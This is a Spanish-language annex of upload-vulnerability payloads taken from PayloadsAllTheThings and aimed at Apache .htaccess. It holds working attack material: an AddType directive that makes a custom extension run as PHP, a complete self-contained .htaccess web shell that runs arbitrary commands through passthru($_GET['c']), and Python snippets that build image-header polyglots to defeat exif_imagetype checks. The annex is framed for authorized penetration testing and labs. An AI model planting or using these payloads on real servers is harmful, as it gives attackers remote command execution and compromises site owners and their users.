# Vulnerabilidades de subida de archivos: anexo de ejemplos de PayloadsAllTheThings

> **Uso:** elegir el bloque que corresponde al motor, versión y punto de entrada. Las líneas de un bloque pueden ser alternativas. Sustituir hosts, rutas, identificadores y dominios por los del laboratorio o alcance autorizado. Los ejemplos originales son referencias de sintaxis, no pruebas verificadas contra el objetivo.

**Documento de origen:** [Upload Insecure Files/Configuration Apache .htaccess/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess/README.md), revisión fija 3ac27901c711. **Licencia:** [MIT de Swissky](../../LICENCIA_PATT.md).

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md)

## 1. .htaccess / AddType Directive

### Variantes presentes en tablas o texto del apartado

```text
AddType application/x-httpd-php .rce
.rce
```

## 2. .htaccess / Self Contained .htaccess

```python
# Self contained .htaccess web shell - Part of the htshell project
# Written by Wireghoul - http://www.justanotherhacker.com

# Override default deny rule to make .htaccess file accessible over web
<Files ~ "^\.ht">
Order allow,deny
Allow from all
</Files>

# Make .htaccess file be interpreted as php file. This occur after apache has interpreted
# the apache directives from the .htaccess file
AddType application/x-httpd-php .htaccess
```

```php
###### SHELL ######
<?php echo "\n";passthru($_GET['c']." 2>&1"); ?>
```

## 3. .htaccess / Polyglot .htaccess

```python
    width = 50
    height = 50
    payload = '# .htaccess file'

    with open('.htaccess', 'w') as htaccess:
        htaccess.write('#define test_width %d\n' % (width, ))
        htaccess.write('#define test_height %d\n' % (height, ))
        htaccess.write(payload)
```

```python
    type_header = b'\x00'
    fixed_header = b'\x00'
    width = b'50'
    height = b'50'
    payload = b'# .htaccess file'

    with open('.htaccess', 'wb') as htaccess:
        htaccess.write(type_header + fixed_header + width + height)
        htaccess.write(b'\n')
        htaccess.write(payload)
```

### Variantes presentes en tablas o texto del apartado

```text
exif_imagetype
.htaccess/image
.htaccess
\x00
#
.htaccess/xbm
.htaccess/wbmp
```

---

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md) · [Licencia de origen](../../LICENCIA_PATT.md)
